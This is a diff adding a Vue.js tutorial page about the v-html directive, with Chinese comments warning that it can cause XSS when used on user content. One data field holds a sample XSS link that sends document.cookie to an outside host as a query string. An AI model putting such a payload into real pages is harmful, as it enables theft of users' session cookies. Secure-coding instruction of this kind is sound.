@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>v-text</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <!--
+        v-html 指令
+          1.作用: 向指定節點中渲染包含html結構的內容
+          2.與插值語法的區別:
+            (1)v-html會替換掉節點中所有的內容，{{xxx}}則不會
+            (2)v-html可以識別html結構
+          3.嚴重注意:v-html有安全性問題
+            (1)在網站上動態渲染任意html非常危險，容易導致XSS攻擊
+            (2)一定要在可信的內容上使用v-html，永遠不要用在用戶的提交內容上
+    -->
+    <div id="root">
+        <div>你好，{{name}}</div>
+        <!-- v-html 支持解析標籤 -->
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+
+    <script type="text/javascript">
+        const vm = new Vue({  
+            el: '#root',  
+            data: {   
+               name:'上硅谷',
+               str: '<h3>你好阿!</h3>',
+               str2: '<a href=javascript:location.href="http://www.google.com?"+document.cookie>優呵呵呵呵</a>'
+               // 獲取當前網站的 cookie，再跳走，並把 cookie 當用 query string 傳給目的地
+            },
+        })  
+    </script>
+</body>
+</html>
